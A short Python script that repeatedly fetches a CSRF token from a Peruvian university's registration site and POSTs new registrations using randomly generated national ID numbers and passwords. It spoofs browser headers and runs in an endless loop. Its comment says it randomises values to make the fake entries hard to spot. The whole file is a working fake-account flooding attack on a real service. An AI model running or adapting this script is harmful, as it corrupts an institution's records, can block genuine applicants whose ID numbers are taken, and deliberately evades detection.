from bs4 import BeautifulSoup
import requests
import random
import time
headers = {
    "Origin":"http://www.inscripciones.uni.edu.pe",
    "Upgrade-Insecure-Requests":1,
    "Content-Type":"application/x-www-form-urlencoded",
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Referer":"http://www.inscripciones.uni.edu.pe/register",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"es-ES,es;q=0.9,en;q=0.8"
}

"""with open("lastOne.txt","r") as f:
    dni = int(f.read())"""

while True :
    r = requests.get("http://www.inscripciones.uni.edu.pe/login");
    text = r.text
    soup = BeautifulSoup(text , features = "lxml").body
    token = soup.find_all('input')[0]['value']
    dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru now have a ID starting with 7
    password = str(random.randint(100000,999999)) # Making difficult to find wich one is fake
    data = {
        '_token':token,
        'dni': dni_str,
        'password': password,
        'password_confirmation': password
    }
    try:
        r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
    except ValueError:
        print("Error: retrying http post")
        time.sleep(3)
    #if dni%50==0:
    print(str(dni_str)+":"+ "Ok" if r.status_code==200 else "Error")
    """with open("lastOne.txt","w") as f:
            f.write(str(dni))"""
    #dni+=1
